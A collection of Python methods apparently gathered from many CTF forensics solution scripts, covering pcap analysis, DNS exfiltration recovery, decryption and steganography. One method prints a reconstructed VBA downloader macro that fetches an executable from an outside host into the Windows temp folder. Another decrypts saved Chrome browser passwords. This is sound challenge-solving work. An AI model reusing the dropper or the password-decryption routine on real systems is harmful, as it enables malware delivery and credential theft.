from ctfsolver import CTFSolver


class Gathering(CTFSolver):
    def gathering(self):
        pass
	# /home/figaro/CTF/Categories/Forensics/picoCTF/Blast_from_the_past_picoCTF_2024/payloads/solution.py
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.image_modified = Path(self.folder_data, "modified.jpg")
        self.copy(self.challenge_file, self.image_modified)

	# /home/figaro/CTF/Categories/Forensics/picoCTF/Blast_from_the_past_picoCTF_2024/payloads/solution.py
    def modify_picture(self):
        image = Image.open(self.challenge_file.as_posix())

        exif_dict = piexif.load(image.info.get("exif", b""))
        # exif_dict = piexif.load(self.challenge_file)
        exif_bytes = piexif.dump(exif_dict)

        for k, v in exif_dict.items():
            print(k, v)

	# /home/figaro/CTF/Categories/Forensics/picoCTF/Blast_from_the_past_picoCTF_2024/payloads/solution.py
    def copy(self, file1, file2):
        with open(file1, "rb") as f:
            data = f.read(2048 * 2048)
            with open(file2, "wb") as f2:
                f2.write(data)

	# /home/figaro/CTF/Categories/Forensics/picoCTF/Blast_from_the_past_picoCTF_2024/payloads/solution.py
    def main(self):
        self.modify_picture()

	# /home/figaro/CTF/Categories/Forensics/picoCTF/PcapPoisoning/payloads/solution.py
    def searching_packets(self, packets, text):
        for i, packet in enumerate(packets):
            if packet.haslayer("Raw"):
                if text.encode() in packet["Raw"].load:
                    print(f"Found {text} in packet {i}")
                    print(packet.show())
                    print(packet.summary())
                    return packet["Raw"].load.decode("utf-8")

	# /home/figaro/CTF/Categories/Forensics/picoCTF/PcapPoisoning/payloads/solution.py
    def main(self):
        self.packets = rdpcap(self.challenge_file.as_posix())
        flag = self.searching_packets(self.packets, "pico")
        print(flag)

	# /home/figaro/CTF/Categories/Forensics/picoCTF/hideme/payloads/solution.py
    def extract_files_from_binary(self, filepath):
        binwalk_obj = binwalk.Binwalk()

        results = binwalk_obj.scan(filepath)

        if not results:
            print("No files found")
            return

        for result in results:
            if result.extracted:
                print(f"Extracted {result.file.path}")
                for extracted_file in result.extracted:
                    print(f"Extracted {extracted_file}")
            else:
                print(f"Could not extract {result.file.path}")

	# /home/figaro/CTF/Categories/Forensics/picoCTF/hideme/payloads/solution.py
    def main(self):
        # self.extract_files_from_binary(self.challenge_file)
        pass

	# /home/figaro/CTF/Categories/Forensics/picoCTF/endianness_v2/payloads/solution.py
    def hexdump_to_binary(self, hexdump_file, binary_file):
        with open(hexdump_file, "rb") as f:
            hexdump_data = f.read()

        hex_data = []

        for i in range(0, len(hexdump_data), 4):
            chunk = hexdump_data[i : i + 4]
            # If the chunk is less than 4 bytes, pad it with zeros
            if len(chunk) < 4:
                # chunk += b"\x00" * (4 - len(chunk))
                chunk = chunk.ljust(4, b"\x00")
            hex_data.append(f"{struct.unpack('<I', chunk)[0]:08x}")

        hex_output = "".join(hex_data)

        binary_output = binascii.unhexlify(hex_output)

        with open(binary_file, "wb") as f:
            f.write(binary_output)

	# /home/figaro/CTF/Categories/Forensics/picoCTF/endianness_v2/payloads/solution.py
    def main(self):
        self.lastfile = Path(self.folder_data, "lastfile")
        self.hexdump_to_binary(self.challenge_file, self.lastfile)

	# /home/figaro/CTF/Categories/Forensics/picoCTF/Ph4nt0m_1ntrud3r/payloads/solution.py
    def main(self):
        packets = rdpcap(self.challenge_file.as_posix())
        result = {}
        for packet in packets:
            if packet.haslayer("Raw") and packet["Raw"].load is not None:
                result[str(packet.time)] = packet["Raw"].load

        print(result)

        sorted_keys = sorted(result.keys())
        flag = ""
        for key in sorted_keys:
            if key >= "1741231916.092334":
                flag += self.decode_base64(result[key].decode("utf-8"))

        pyperclip.copy(flag)

	# /home/figaro/CTF/Categories/Forensics/picoCTF/flags_are_stepic/payloads/solution.py
    def differ(self):
        self.list_1_file = self.folfil("files", "list.txt")
        self.list_2_file = self.folfil("files", "html_list_2.txt")

        # Read the first list
        with open(self.list_1_file, "r") as f:
            self.list_1 = f.read().splitlines()

        # Read the second list
        with open(self.list_2_file, "r") as f:
            self.list_2 = f.read().splitlines()

        # Get the difference between the two lists
        diff = list(set(self.list_1) - set(self.list_2))
        # Print the difference
        print(diff)

	# /home/figaro/CTF/Categories/Forensics/picoCTF/flags_are_stepic/payloads/solution.py
    def download_images(self, name):
        url = f"{self.url}:{self.port}/flags/{name}.png"
        try:
            response = requests.get(url)
            if response.status_code == 200:
                flags_path = self.folfil("files", "flags")
                file_path = self.Path(flags_path, f"{name}.png")
                with open(file_path, "wb") as f:
                    f.write(response.content)
                print(f"Downloaded {name}.png")
            else:
                print(f"Error downloading {name}.png")
        except Exception as e:
            print(f"Error downloading {name}.png")
            print(e)

	# /home/figaro/CTF/Categories/Forensics/picoCTF/flags_are_stepic/payloads/solution.py
    def main(self):
        lst = itertools.product(string.ascii_lowercase, repeat=3)
        lst = list(map(lambda x: "".join(x), lst))

        # for name in lst:
        #     self.download_images(name)

        self.download_images("upz")

	# /home/figaro/CTF/Categories/Forensics/bsides/Server_Lookup/payloads/solution.py
    def print_to_File(self, data, verbose=False, file_name="output.txt"):

        if verbose:
            print(data)
        with open(self.folfil("data", file_name), "a") as f:
            f.write(data + "\n")

	# /home/figaro/CTF/Categories/Forensics/bsides/Server_Lookup/payloads/solution.py
    def reassemblying_dns(self, packets=None):
        if packets is None:
            packets = self.packets

        hex_parts = []

        dns_packets = []
        for packet in packets:
            # if packet.haslayer("DNS") and packet["DNS"].qr == 0:  # DNS query
            #     query_name = packet["DNS"].qd.qname.decode("utf-8").strip(".")
            #     dns_packets.append(query_name)

            if packet.haslayer(DNSQR):
                qname = packet[DNSQR].qname.decode()
                qname = packet[DNSQR].qname.decode(errors="ignore").strip(".")

                # Extract the first label (before the first dot)
                # part = qname.split(".")[0]
                labels = qname.split(".")
                for part in labels:
                    # Must be even-length hex and not too short
                    if re.fullmatch(r"[a-fA-F0-9]{2,}", part) and len(part) % 2 == 0:
                        if part not in hex_parts:
                            hex_parts.append(part)

        hex_data = "".join(hex_parts)
        try:
            exfiltrated_data = bytes.fromhex(hex_data).decode("utf-8")

            with open(self.folfil("data", "exfiltrated.txt"), "w") as f:
                f.write(exfiltrated_data)

        except ValueError:
            exfiltrated_data = "Invalid hex data"

        return exfiltrated_data

	# /home/figaro/CTF/Categories/Forensics/bsides/Server_Lookup/payloads/solution.py
    def breakfiles(self, exfiltrated_data):

        lines = []
        counter = 0
        delimiters = [
            "From",
            "UEsDBg",
            "--boundary_AA",
            "UEsDBg",
            "Content-Transfer-Encoding: base64",
        ]

        for line in exfiltrated_data.splitlines():
            if line.startswith(tuple(delimiters)):
                lines.append([])
                counter += 1
            if line != "\n":
                lines[counter - 1].append(line)

        for i in range(1, counter + 1):
            with open(self.folfil("data", f"basefile_{i}.txt"), "w") as f:
                f.write("\n".join(lines[i - 1]))

	# /home/figaro/CTF/Categories/Forensics/bsides/Server_Lookup/payloads/solution.py
    def main(self):
        # self.pcap_open()
        self.packets = rdpcap(self.challenge_file.as_posix())
        data = self.reassemblying_dns()

        exfiltrated_file = self.folfil("data", "exfiltrated.txt")

        with open(exfiltrated_file, "r") as f:
            exfiltrated_data = f.read()

        self.breakfiles(exfiltrated_data)
        chosen_file = self.folfil("data", "basefile_2.txt")
        with open(chosen_file, "r") as f:
            base64_data = f.readlines()

        # Clean up the first two and last two  lines
        base64_data = [
            line.strip()
            for i, line in enumerate(base64_data)
            if i not in [0, 1, len(base64_data) - 1, len(base64_data) - 2]
        ]

        # Join and clean only base64 chars
        cleaned_data = "\n".join(base64_data)

        with open(self.folfil("data", "base64formated.txt"), "wb") as f:
            f.write(cleaned_data.encode("utf-8"))

	# /home/figaro/CTF/Categories/Forensics/bsides/Charter/payloads/solution.py
    def main(self):
        pass

	# /home/figaro/CTF/Categories/Forensics/CSCG/Somebody_Save_Me/payloads/solution.py
    def main(self):
        strings = self.extract_strings(self.challenge_file, min_length=20)

        strings_sorted = sorted(strings, key=len, reverse=True)
        # print(strings_sorted)

        base64_to_try = [2, 9, 12, 13]

        for i in base64_to_try:
            base64_strings = strings_sorted[i]

            decoded = self.decode_base64(base64_strings)
            if decoded is not None and "csc" in decoded:
                print(decoded)
                break

	# /home/figaro/CTF/Categories/Forensics/CSCG/Logistics/payloads/solution.py
    def main(self):
        text = "mnzwg63ngrrxembvl42hem27oazxezrtmn2gy6k7myyw4m35"

        text = text.upper()
        print(text)

	# /home/figaro/CTF/Categories/Forensics/CSCG/Logistics/payloads/solution.py
    def trying_to_exploit_ods(self):
        # Extract macros from the ODS file
        # macros = self.extract_macros_from_ods_initial()
        # Print the extracted macros

        files = self.list_all_files(self.challenge_file)
        # macros = self.extract_macros_with_odfpy(self.challenge_file)
        macros = self.extract_macros_with_odfpy(self.challenge_file, files)
        print(macros)

	# /home/figaro/CTF/Categories/Forensics/CSCG/Logistics/payloads/solution.py
    def extract_macros_with_odfpy(self, ods_file, files):
        macros = []
        with zipfile.ZipFile(ods_file, "r") as z:
            for file in files:
                if file.endswith(".xml"):
                    with z.open(file) as f:
                        try:
                            # Parse the XML file
                            tree = ET.parse(f)
                            root = tree.getroot()

                            # Search for macro-related elements
                            for elem in root.iter():
                                if elem.tag.endswith("script"):
                                    macros.append(ET.tostring(elem, encoding="unicode"))

                        except ET.ParseError:
                            print(f"Error parsing {file}. Skipping...")

        if macros:
            # Pretty-print the extracted macros
            pretty_macros = [
                parseString(macro).toprettyxml(indent="  ") for macro in macros
            ]
            return "\n\n".join(pretty_macros)
        else:
            return "No macros found."

	# /home/figaro/CTF/Categories/Forensics/CSCG/Logistics/payloads/solution.py
    def list_all_files(self, ods_file):
        """
        Lists all files in the ODS archive for manual inspection.

        Args:
            ods_file (str): Path to the ODS file.

        Returns:
            list: A list of files inside the ODS archive.
        """
        with zipfile.ZipFile(ods_file, "r") as ods:
            return ods.namelist()

	# /home/figaro/CTF/Categories/Forensics/CSCG/Logistics/payloads/solution.py
    def extract_macros_from_file(self, ods_file, file_name):
        """
        Extracts content from a specific file inside the ODS archive.

        Args:
            ods_file (str): Path to the ODS file.
            file_name (str): Name of the file inside the archive to extract.

        Returns:
            str: The content of the specified file.
        """
        try:
            with zipfile.ZipFile(ods_file, "r") as ods:
                with ods.open(file_name) as file:
                    return file.read().decode("utf-8")
        except Exception as e:
            return f"Failed to extract {file_name}: {e}"

	# /home/figaro/CTF/Categories/Forensics/CSCG/Logistics/payloads/solution.py
    def extract_macros_from_ods(self, ods_file):
        """
        Attempts to extract macros from various files in the ODS archive.

        Args:
            ods_file (str): Path to the ODS file.

        Returns:
            str: Extracted macros or debug information.
        """
        try:
            # List all files in the ODS archive
            all_files = self.list_all_files(ods_file)

            # Identify potential macro-related files
            macro_candidates = [
                f
                for f in all_files
                if "scripts" in f or "content" in f or "settings" in f
            ]

            macros = []
            for candidate in macro_candidates:
                content = self.extract_macros_from_file(ods_file, candidate)
                if "<script" in content or "<macro" in content:
                    macros.append(f"--- Content from {candidate} ---\n{content}")

            if macros:
                return "\n\n".join(macros)
            else:
                return "No explicit macros found. Check the file structure manually."

        except Exception as e:
            return f"An error occurred: {e}"

	# /home/figaro/CTF/Categories/Forensics/CSCG/Logistics/payloads/solution.py
    def extract_macros_from_ods_initial(self, ods_file=None):
        """
        Extracts macros from an ODS file.

        Args:
            ods_file (str): Path to the ODS file.

        Returns:
            str: Extracted macros, if any, as plain XML text.
        """

        if ods_file is None:
            ods_file = self.challenge_file

        try:
            with zipfile.ZipFile(ods_file, "r") as ods:
                # List all files in the archive
                file_list = ods.namelist()

                # Look for possible macro-related files
                potential_files = [
                    f
                    for f in file_list
                    if f in ("content.xml", "scripts.xml", "settings.xml", "meta.xml")
                ]
                macros = []

                for file_name in potential_files:
                    with ods.open(file_name) as file:
                        xml_content = file.read()
                        root = ET.fromstring(xml_content)

                        # Search for common macro tags (e.g., <script>, <macro>)
                        for macro in root.iter():
                            if any(
                                keyword in macro.tag.lower()
                                for keyword in ("script", "macro")
                            ):
                                macros.append(ET.tostring(macro, encoding="unicode"))

                if macros:
                    return "\n\n".join(macros)
                else:
                    return "No macros found in the ODS file."

        except zipfile.BadZipFile:
            return "The provided file is not a valid ODS file."
        except ET.ParseError:
            return "Failed to parse XML content from the ODS file."
        except Exception as e:
            return f"An error occurred: {e}"

	# /home/figaro/CTF/Categories/Forensics/NTUA/Browser_Passwords/payloads/solution.py
    def connecting_db(self):
        with sqlite3.connect(self.challenge_file) as conn:
            cursor = conn.cursor()
            cursor.execute(
                "SELECT action_url, username_value, password_value FROM logins"
            )
            return cursor.fetchall()

	# /home/figaro/CTF/Categories/Forensics/NTUA/Browser_Passwords/payloads/solution.py
    def load_master_key(self):
        with open(self.Path(self.folder_files, "mkey.json"), "r") as mkey_file:
            mkey_data = json.load(mkey_file)
        master_key_id = list(mkey_data["masterkeys"].keys())[0]
        master_key = bytes.fromhex(mkey_data["masterkeys"][master_key_id])
        return master_key

	# /home/figaro/CTF/Categories/Forensics/NTUA/Browser_Passwords/payloads/solution.py
    def main(self):
        with open(self.Path(self.folder_files, "Local_State")) as login_state:
            login_state = json.load(login_state)

        encrypted_key = login_state["os_crypt"]["encrypted_key"]
        encrypted_key = base64.b64decode(encrypted_key)[2:-1]
        # decrypted_key = win32crypt.CryptUnprotectData(
        #     encrypted_key, None, None, None, 0
        # )[1]

        # master_key = self.load_master_key()
        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[
            1
        ]

        print("Connecting to database")
        logins = self.connecting_db()

        url = logins[0][0]
        username = logins[0][1]
        password = logins[0][2]
        print(password)
        # decrypted = self.decrypt_password(password, encrypted_key)
        decrypted = self.decrypt_password(password, master_key)

        print(decrypted)

	# /home/figaro/CTF/Categories/Forensics/NTUA/Browser_Passwords/payloads/solution.py
    def generate_cipher(self, aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

	# /home/figaro/CTF/Categories/Forensics/NTUA/Browser_Passwords/payloads/solution.py
    def decrypt_payload(self, cipher, payload):
        return cipher.decrypt(payload)

	# /home/figaro/CTF/Categories/Forensics/NTUA/Browser_Passwords/payloads/solution.py
    def decrypt_password(self, ciphertext, secret_key):
        try:
            # (3-a) Initialisation vector for AES decryption
            initialisation_vector = ciphertext[3:15]
            # (3-b) Get encrypted password by removing suffix bytes (last 16 bits)
            # Encrypted password is 192 bits
            encrypted_password = ciphertext[15:-16]
            # (4) Build the cipher to decrypt the ciphertext
            cipher = self.generate_cipher(secret_key, initialisation_vector)
            decrypted_pass = self.decrypt_payload(cipher, encrypted_password)
            decrypted_pass = decrypted_pass.decode()
            return decrypted_pass
        except Exception as e:
            print("%s" % str(e))
            print(
                "[ERR] Unable to decrypt, Chrome version <80 not supported. Please check."
            )
            return ""

	# /home/figaro/CTF/Categories/Forensics/NTUA/Givaway/payloads/solution.py
    def translated(self):  # Reconstructing the strings based on the VBA code logic
        part_1 = (
            "https://elvesfactory/"
            + chr(ord("H"))
            + chr(84)
            + chr(ord("B"))
            + ""
            + chr(123)
            + ""
            + chr(84)
            + chr(ord("h"))
            + "1"
            + chr(125 - 10)
            + chr(ord("_"))
            + "1s"
            + chr(95)
            + "4"
        )
        part_2 = "_" + "present".replace("e", "3") + chr(85 + 10)
        part_3 = "everybody".replace("e", "3")
        part_3 = part_3.replace("o", "0") + "_"
        part_4 = (
            chr(ord("w"))
            + "4"
            + chr(110)
            + "t"
            + chr(115)
            + "_"
            + chr(ord("f"))
            + "0"
            + chr(121 - 7)
            + chr(95)
        )
        part_5 = "christmas".replace("i", "1")
        part_5 = part_5.replace("a", "4") + chr(119 + 6)

        # Resultant concatenated string for "strRT"
        part_6 = part_1 + part_2 + part_3 + part_4 + part_5

        # Generating the 'strTecation' path
        part_7 = "c:\\" + chr(ord("W")) + "indows\\" + chr(ord("T")) + "emp\\444.exe"

        # Placeholder for variable `mttt`, assuming it is defined elsewhere
        mttt = 120  # Adjust as per VBA code logic
        part_7 = (
            'CreateObject("MSXML2.'
            + chr(mttt - 54)
            + chr(mttt)
            + chr(mttt - 11)
            + chr(mttt - 12)
            + chr(72)
            + chr(84)
            + chr(84)
            + chr(80)
            + '")'
        )

        # Simulating VBA code file writing
        output_lines = []
        output_lines.append(f"strRT = {part_6}")
        output_lines.append(f'strTecation = "{part_7}"')
        output_lines.append(f"Set objXMLHTTP = {part_7}")
        output_lines.append('objXMLHTTP.open "GET", strRT, False')
        output_lines.append("objXMLHTTP.send()")
        output_lines.append("If objXMLHTTP.Status = 200 Then")
        output_lines.append('Set objADOStream = CreateObject("ADODB.Stream")')
        output_lines.append("objADOStream.Open")
        output_lines.append("objADOStream.Type = 1")
        output_lines.append("objADOStream.Write objXMLHTTP.ResponseBody")
        output_lines.append("objADOStream.Position = 0")
        output_lines.append(f"objADOStream.SaveToFile {part_7}")
        output_lines.append("objADOStream.Close")
        output_lines.append("Set objADOStream = Nothing")
        output_lines.append("End if")
        output_lines.append("Set objXMLHTTP = Nothing")
        output_lines.append('Set objShell = CreateObject("WScript.Shell")')

        # Printing the output lines (would typically write to a file)
        for line in output_lines:
            print(line)

        # Values of constructed variables for validation
        print("Constructed Values:")
        print("HPkXUcxLcAoMHOlj:", part_1)
        print("cxPZSGdIQDAdRVpziKf:", part_2)
        print("fqtSMHFlkYeyLfs:", part_3)
        print("ehPsgfAcWaYrJm:", part_4)
        print("FVpHoEqBKnhPO:", part_5)
        print("strRT:", part_6)
        print("strTecation:", part_7)

	# /home/figaro/CTF/Categories/Forensics/NTUA/Givaway/payloads/solution.py
    def main(self):
        self.translated()

	# /home/figaro/CTF/Categories/Forensics/NTUA/ICMP_Party/payloads/solution.py
    def get_packets_icmp(self, packets=None):
        """
        Description:
        Get all the ICMP packets from the packets

        Args:
            packets (list, optional): List of packets to search in. Defaults to None.

        Returns:
            list: List of ICMP packets
        """

        if packets is None:
            packets = self.packets

        icmp_packets = [packet for packet in packets if packet.haslayer("ICMP")]

        return icmp_packets

	# /home/figaro/CTF/Categories/Forensics/NTUA/ICMP_Party/payloads/solution.py
    def get_packet_ttl(self, packets=None):
        """
        Description:
        Get the TTL of all the ICMP packets

        Args:
            packets (list, optional): List of packets to search in. Defaults to None.

        Returns:
            list: List of TTL of the ICMP packets
        """
        if packets is None:
            packets = self.packets

        icmp_ttl = [packet.ttl for packet in packets]

        return icmp_ttl

	# /home/figaro/CTF/Categories/Forensics/NTUA/ICMP_Party/payloads/solution.py
    def main(self):
        self.pcap_open()
        icmp_packets = self.get_packets_icmp()
        ttl = self.get_packet_ttl(packets=icmp_packets)

        flag = ""
        for i in ttl:
            if i != 64:
                flag += chr(i)
        print(flag)

	# /home/figaro/CTF/Categories/Forensics/NTUA/PDF_1/payloads/solution.py
    def main(self):
        text = self.textFromPDF()
        partial_flag = "NH"
        shift = self.rot_bruteforce(text, partial_flag)
        # ROT47
        print(f"Shift: {shift}")
        flag = self.rot(text, shift)
        self.flag = flag
        print(f"Flag: {flag}")

	# /home/figaro/CTF/Categories/Forensics/NTUA/PDF_1/payloads/solution.py
    def rot_bruteforce(self, crypted_text, known_text, max_shift=94):
        """
        Brute forces ROT47 shifts to find the one that contains the known text.

        Args:
            crypted_text (str): The encrypted text.
            known_text (str): The known plaintext to look for.
            max_shift (int): The maximum shift to attempt (ROT47 has 94 shifts).

        Returns:
            int: The shift that contains the known text, or -1 if not found.
        """
        for shift in range(1, max_shift):
            decrypted_text = self.rot(crypted_text, shift)
            if known_text.lower() in decrypted_text.lower():
                return shift
        return -1

	# /home/figaro/CTF/Categories/Forensics/NTUA/PDF_1/payloads/solution.py
    def rot(self, text, shift):
        """
        Applies the ROT47 cipher to the given text with the specified shift.

        Args:
            text (str): The input text.
            shift (int): The ROT47 shift amount.

        Returns:
            str: The transformed text.
        """
        return "".join([self.rot_char(c, shift) for c in text])

	# /home/figaro/CTF/Categories/Forensics/NTUA/PDF_1/payloads/solution.py
    def rot_char(self, c, shift):
        """
        Rotates a single character using the ROT47 cipher.

        Args:
            c (str): The input character.
            shift (int): The ROT47 shift amount.

        Returns:
            str: The rotated character.
        """
        ascii_code = ord(c)
        if 33 <= ascii_code <= 126:  # ROT47 only affects printable ASCII
            return chr((ascii_code - 33 + shift) % 94 + 33)
        return c

	# /home/figaro/CTF/Categories/Forensics/NTUA/PDF_1/payloads/solution.py
    def textFromPDF(self, file=None):
        """
        Extracts text from a PDF file.

        Args:
            file (str): Path to the PDF file. Defaults to the challenge file.

        Returns:
            str: The extracted text.
        """
        if file is None:
            file = self.challenge_file

        with pdfplumber.open(file) as pdf:
            text = ""
            for page in pdf.pages:
                text += page.extract_text()
        return text

	# /home/figaro/CTF/Categories/Forensics/HTB/Fake_Boost/payloads/solution.py
    def main(self):
        self.challenge_file = self.Path(self.folder_data, self.file)

        self.aes_key_base64 = "Y1dwaHJOVGs5d2dXWjkzdDE5amF5cW5sYUR1SWVGS2k="
        self.aes_key = base64.b64decode(self.aes_key_base64)
        encrypted_base64 = open(self.challenge_file, "r").read().strip()
        decrypted_text = self.decrypt_string(encrypted_base64, self.aes_key)
        print("Decrypted text:", decrypted_text)

	# /home/figaro/CTF/Categories/Forensics/HTB/Fake_Boost/payloads/solution.py
    def decrypt_string(self, encrypted_base64, key):
        full_data = base64.b64decode(encrypted_base64)

        iv = full_data[: AES.block_size]
        encrypted_message = full_data[AES.block_size :]

        cipher = AES.new(key, AES.MODE_CBC, iv)

        decrypted_bytes = cipher.decrypt(encrypted_message)

        pad = decrypted_bytes[-1]
        decrypted_bytes = decrypted_bytes[:-pad]

        return decrypted_bytes.decode("utf-8")

	# /home/figaro/CTF/Categories/Forensics/HTB/Binary_Badresources/payloads/solution.py
    def main(self):
        encrypted_text = "ZzfccaKJB3CrDvOnj/6io5OR7jZGL0pr0sLO/ZcRNSa1JLrHA+k2RN1QkelHxKVvhrtiCDD14Aaxc266kJOzF59MfhoI5hJjc5hx7kvGAFw="

        password = "vudzvuokmioomyialpkyydvgqdmdkdxy"

        decrypted_text = self.decrypt(encrypted_text, password)
        print("Decrypted text:", decrypted_text)

	# /home/figaro/CTF/Categories/Forensics/HTB/Binary_Badresources/payloads/solution.py
    def derive_key_and_iv(self, password, salt, key_length, iv_length):
        d = SHA256.new()
        d.update(password.encode("utf-8"))
        key = d.digest()[:key_length]
        iv = salt.encode("utf-8")[:iv_length]
        return key, iv

	# /home/figaro/CTF/Categories/Forensics/HTB/Binary_Badresources/payloads/solution.py
    def decrypt(self, ciphertext_base64, password):
        ciphertext = base64.b64decode(ciphertext_base64)
        salt = "tbbliftalildywic"

        key, iv = self.derive_key_and_iv(password, salt, 32, 16)

        cipher = AES.new(key, AES.MODE_CBC, iv)

        plaintext = cipher.decrypt(ciphertext)

        plaintext = plaintext.rstrip(b"\x00")

        return plaintext.decode("utf-8")

	# /home/figaro/CTF/Categories/Forensics/HTB/Data_Siege/payloads/solution.py
    def main(self):
        # Get packets from the pcap file
        self.pcap_open()

        tcp_stream_5 = self.get_tcp_stream(5)

        tcp_stream_5 = self.creating_stream(packets=tcp_stream_5)[0]

        # To get the payload
        data_24 = bytes(tcp_stream_5[25][TCP].payload)
        data_45 = bytes(tcp_stream_5[45][TCP].payload).decode()

        # print(base64.b64decode(data_24))

        payload_base64 = data_45.split('"')[1]

        payload = base64.b64decode(payload_base64).decode()
        print(payload)

	# /home/figaro/CTF/Categories/Forensics/HTB/Data_Siege/payloads/solution.py
    def get_tcp_stream(self, number):
        tcp_streams = self.creating_stream()
        return tcp_streams[number]

	# /home/figaro/CTF/Categories/Forensics/HTB/Data_Siege/payloads/solution.py
    def stream_identifier(self, pkt):
        if TCP in pkt:
            src = pkt[IP].src
            dst = pkt[IP].dst
            sport = pkt[TCP].sport
            dport = pkt[TCP].dport
            # Create a unique identifier for both directions
            return tuple(sorted([(src, sport), (dst, dport)]))
        return None

	# /home/figaro/CTF/Categories/Forensics/HTB/Data_Siege/payloads/solution.py
    def creating_stream(self, packets=None, save=False, return_dict=False):

        if packets is None:
            packets = self.packets

        # Dictionary to hold streams
        tcp_streams = {}

        # Iterate over packets to group them into streams
        for pkt in packets:
            if TCP in pkt:
                stream_id = self.stream_identifier(pkt)
                if stream_id:
                    if stream_id not in tcp_streams:
                        tcp_streams[stream_id] = []
                    tcp_streams[stream_id].append(pkt)

        if return_dict:
            return tcp_streams

        tcp_streams = list(tcp_streams.values())

        return tcp_streams

	# /home/figaro/CTF/Categories/Forensics/HTB/Cave_Expedition/payloads/solution.py
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

        self.folder_logs = self.Path(self.folders["files"], "Logs")
        self.folder_xml = self.Path(self.folders["data"], "xml")

	# /home/figaro/CTF/Categories/Forensics/HTB/Cave_Expedition/payloads/solution.py
    def xor_decrypt(self, data: bytes, key1: bytes, key2: bytes = None) -> bytes:
        output = bytearray(len(data))
        key1 = bytearray(key1)
        if key2:
            key2 = bytearray(key2)
        for i in range(len(data)):
            k1 = key1[i % len(key1)]
            if key2:
                k2 = key2[i % len(key2)]
                output[i] = data[i] ^ k1 ^ k2
            else:
                output[i] = data[i] ^ k1
        return bytes(output)

	# /home/figaro/CTF/Categories/Forensics/HTB/Cave_Expedition/payloads/solution.py
    def emilia_main(self):

        # Key from $a53Va (known good key)
        # NXhzR09iakhRaVBBR2R6TGdCRWVJOHUwWVNKcTc2RWl5dWY4d0FSUzdxYnRQNG50UVk1MHlIOGR6S1plQ0FzWg==
        key1_b64 = "NXhzR09iakhRaVBBR2R6TGdCRWVJOHUwWVNKcTc2RWl5dWY4d0FSUzdxYnRQNG50UVk1MHlIOGR6S1plQ0FzWg=="
        key1 = base64.b64decode(key1_b64)
        # key1 = base64.b64decode(key1)

        # Read the encrypted .secured file (Base64-encoded)
        with open(self.challenge_file, "rb") as f:

            encrypted_b64 = bytearray(f.read())

        encrypted_data = base64.b64decode(encrypted_b64)

        # Try decrypting with single key
        decrypted_data_1 = self.xor_decrypt(encrypted_data, key1)

        # Try decrypting with both keys (if key2 is usable)
        # So one key is weird because in the powershell script it tried to decode it with UTF-8 and i think that would lead to an error
        # So there is a chance that only one key is used due to the try-catch brackets leaving one key null but im not sure.
        key2_str = "n2mmXaWy5pL4kpNWr7bcgEKxMeUx50MJ"

        try:
            key2 = base64.b64decode(key2_str)
            decrypted_data_2 = self.xor_decrypt(encrypted_data, key1, key2)
        except Exception as e:
            print(f"[!] Dual-key decode failed: {e}")
            decrypted_data_2 = None

        # Save both outputs as .bin files for analysis
        output_single_key = self.folfil("data", "output_single_key.bin")
        with open(output_single_key, "wb") as f:
            f.write(decrypted_data_1)
            print("[+] Decrypted with single key -> output_single_key.bin")

        if decrypted_data_2:
            output_dual_key = self.folfil("data", "output_dual_key.bin")
            with open(output_dual_key, "wb") as f:

                f.write(decrypted_data_2)
                print("[+] Decrypted with both keys -> output_dual_key.bin")

        key3_b64 = "5xsGObjHQiPAGdzLgBEeI8u0YSJq76Eiyuf8wARS7qbtP4ntQY50yH8dzKZeCAsZn2mmXaWy5pL4kpNWr7bcgEKxMeUx50MJ"
        key3 = base64.b64decode(key3_b64)
        decrypted_data_3 = self.xor_decrypt(encrypted_data, key3)
        output_join_key = self.folfil("data", "output_join_key.bin")
        with open(output_join_key, "wb") as f:
            f.write(decrypted_data_3)
            print("[+] Decrypted with join key -> output_join.bin")

	# /home/figaro/CTF/Categories/Forensics/HTB/Cave_Expedition/payloads/solution.py
    def getting_base64(self):
        sysmon_file = self.Path(
            self.folders["data"], "emilia", "Sysmon_Operational.txt"
        )
        with open(sysmon_file, "r") as f:
            text = f.read()
        base64_strings = self.custom_re_match_base64_string(text)

        result = b""

        for base64_string in base64_strings:
            decoded = base64.b64decode(base64_string)
            result += decoded
        return result

	# /home/figaro/CTF/Categories/Forensics/HTB/Cave_Expedition/payloads/solution.py
    def custom_re_match_base64_string(self, text: str, strict=False) -> list[str]:
        """
        Description:
        Find the base64 string in the text

        Args:
            text (str): Text to search for base64 string
            strict (bool, optional): If True, it will only return the base64 string. Defaults to False.

        Returns:
            str: list of Base64 string found in the text
        """
        if strict:
            base64_pattern = r"[A-Za-z0-9+/]{70,}={1,2}"
        else:
            base64_pattern = r"[A-Za-z0-9+/]{70,}={0,2}"
        base64_strings = re.findall(base64_pattern, text)
        return base64_strings

	# /home/figaro/CTF/Categories/Forensics/HTB/Cave_Expedition/payloads/solution.py
    def main(self):
        self.emilia_main()

	# /home/figaro/CTF/Categories/Forensics/HTB/Pursue_The_Tracks/payloads/solution.py
    def main(self):
        pass

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.encryption_key = "5UUfizsRsP7oOCAq"

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def pickle_save_data(self, data: any, filename: str, folder: str = "data") -> None:
        """
        Description:
            Save data to a pickle file

        Args:
            data (any): data to write to the pickle file. Can be anything
            filename (str): Filename to save
            folder (str, optional): Folder name inside the ctf folder. Defaults to "data".

        Returns:
            None
        """
        with open(self.folfil(folder, filename), "wb") as f:
            pickle.dump(data, f)

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def pickle_load_data(self, filename: str, folder: str = "data") -> any:
        """
        Description:
            Load data from a pickle file

        Args:
            filename (str): Filename to load the data from
            folder (str, optional): Folder name to find the file to load the data from. Defaults to "data".

        Returns:
            any: Data loaded from pickle
        """
        with open(self.folfil(folder, filename), "rb") as f:
            return pickle.load(f)

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def load_compressed_data(self):
        """
        Description:
            Challenge specific function to load the compressed data
        """
